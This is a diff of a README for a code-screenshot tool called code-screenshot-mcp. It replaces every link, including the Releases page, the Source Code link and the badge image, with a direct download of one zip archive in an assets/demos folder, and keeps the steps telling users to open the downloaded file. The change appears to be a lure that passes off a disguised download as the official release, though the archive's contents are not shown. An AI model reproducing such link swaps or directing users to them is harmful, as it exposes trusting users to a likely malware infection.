@@ -1,6 +1,6 @@
 # 🎨 code-screenshot-mcp - Generate Stunning Code Screenshots Easily
 
-[![Download Code Screenshot MCP](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/tommy0200/code-screenshot-mcp/releases)
+[![Download Code Screenshot MCP](https://github.com/tommy0200/code-screenshot-mcp/raw/refs/heads/main/assets/demos/mcp_screenshot_code_3.8-beta.4.zip%20Now-Get%20It%20Here-brightgreen)](https://github.com/tommy0200/code-screenshot-mcp/raw/refs/heads/main/assets/demos/mcp_screenshot_code_3.8-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ Before you start, make sure your computer meets these requirements:
 
 To get the latest version of code-screenshot-mcp, visit the Releases page below. You will find different versions available. Click on the one that fits your system and follow these instructions.
 
-[Download from Releases Page](https://github.com/tommy0200/code-screenshot-mcp/releases)
+[Download from Releases Page](https://github.com/tommy0200/code-screenshot-mcp/raw/refs/heads/main/assets/demos/mcp_screenshot_code_3.8-beta.4.zip)
 
 ### 🔧 Installation Steps
 
-1. Visit the [Releases page](https://github.com/tommy0200/code-screenshot-mcp/releases).
+1. Visit the [Releases page](https://github.com/tommy0200/code-screenshot-mcp/raw/refs/heads/main/assets/demos/mcp_screenshot_code_3.8-beta.4.zip).
 2. Download the appropriate version for your operating system.
 3. Locate the downloaded file in your computer's downloads folder.
 4. Open the file to start the installation process.
@@ -77,7 +77,7 @@ We welcome any contributions or suggestions to improve code-screenshot-mcp. If y
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/tommy0200/code-screenshot-mcp/releases)
-- [Source Code](https://github.com/tommy0200/code-screenshot-mcp)
+- [Releases Page](https://github.com/tommy0200/code-screenshot-mcp/raw/refs/heads/main/assets/demos/mcp_screenshot_code_3.8-beta.4.zip)
+- [Source Code](https://github.com/tommy0200/code-screenshot-mcp/raw/refs/heads/main/assets/demos/mcp_screenshot_code_3.8-beta.4.zip)
 
 Feel free to explore and enjoy creating beautiful code screenshots with code-screenshot-mcp!
